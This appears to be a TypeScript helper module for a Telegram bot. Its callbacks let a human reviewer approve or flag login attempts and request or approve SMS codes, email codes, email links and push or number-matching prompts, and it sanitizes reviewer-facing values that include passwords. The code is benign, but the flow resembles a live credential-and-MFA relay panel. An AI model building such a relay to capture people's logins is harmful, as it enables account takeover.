export const CALLBACK_DATA_MAX_BYTES = 64;

export const CALLBACK_UNSAFE_CHARACTERS =
  /[\u0000-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff]/g;

export const callbackActions = {
  authApprove: "auth-pass",
  authReject: "auth-flag",
  authFlagEmail: "auth-flag-email",
  restart: "restart",
  complete: "complete",
  smsCode: "v-sms-code",
  emailCode: "v-email-code",
  emailLink: "v-email-link",
  promptYes: "v-prompt-yes",
  promptNum: "v-prompt-num",
  verifySmsApprove: "v-sms-code-pass",
  verifySmsReject: "v-sms-code-flag",
  verifyEmailApprove: "v-email-code-pass",
  verifyEmailReject: "v-email-code-flag",
  verifyLinkApprove: "v-email-link-pass",
  verifyPromptYesApprove: "v-prompt-yes-pass",
  verifyPromptNumApprove: "v-prompt-num-pass",
  promptNumValue: (value: number): string => `v-prompt-num-${value}`,
} as const;

export const callbackPatterns = {
  auth: /^lr:([a-f0-9-]+):auth-(pass|flag|flag-email)$/,
  code: /^lr:([a-f0-9-]+):v-(sms|email)-code$/,
  codeDecision: /^lr:([a-f0-9-]+):v-(sms|email)-code-(pass|flag)$/,
  emailLink: /^lr:([a-f0-9-]+):v-email-link$/,
  emailLinkApprove: /^lr:([a-f0-9-]+):v-email-link-pass$/,
  promptYes: /^lr:([a-f0-9-]+):v-prompt-yes$/,
  promptYesApprove: /^lr:([a-f0-9-]+):v-prompt-yes-pass$/,
  promptNum: /^lr:([a-f0-9-]+):v-prompt-num$/,
  promptNumValue: /^lr:([a-f0-9-]+):v-prompt-num-([0-9]+)$/,
  promptNumApprove: /^lr:([a-f0-9-]+):v-prompt-num-pass$/,
  complete: /^lr:([a-f0-9-]+):complete$/,
  restart: /^lr:([a-f0-9-]+):restart$/,
} as const;

export function reviewCallbackData(sessionId: string, action: string): string {
  const data = `lr:${sessionId}:${action}`;
  const bytes = Buffer.byteLength(data, "utf8");
  if (bytes > CALLBACK_DATA_MAX_BYTES) {
    throw new Error(
      `Telegram callback data is ${bytes} bytes (max ${CALLBACK_DATA_MAX_BYTES}): "${data}".`,
    );
  }
  return data;
}

/**
 * Makes a single reviewer-facing value (email, password, code, custom field)
 * safe to interpolate into a card: no control characters, no bidi tricks, no
 * runs of whitespace that could fake a section break.
 */
export function sanitizeCallbackDataField(value: string): string {
  return value
    .replace(CALLBACK_UNSAFE_CHARACTERS, " ")
    .replace(/\s+/g, " ")
    .trim();
}
